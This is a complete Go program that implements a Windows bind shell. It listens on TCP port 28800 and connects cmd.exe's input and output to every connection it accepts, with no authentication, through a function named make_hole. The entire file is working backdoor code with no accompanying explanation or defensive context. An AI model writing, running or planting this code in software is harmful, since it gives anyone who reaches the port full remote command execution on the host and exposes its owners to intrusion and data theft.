package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (flusher *Flusher) Write(b []byte) (int, error) {
	count, err := flusher.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := flusher.w.Flush(); err != nil {
		return -1, err
	}
	return count, nil
}

func make_hole(connection net.Conn) {
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = connection
	cmd.Stdout = NewFlusher(connection)
	err := cmd.Run()
	if err != nil {
		fmt.Println("Error occured during shell starting")
	}
}

func main() {
	listener, err := net.Listen("tcp", ":28800")
	if err != nil {
		fmt.Println("Failed to start listener")
		return
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Failed to accept connection")
			continue
		}
		fmt.Println("Connection was established successfully")
		go make_hole(conn)
	}
}
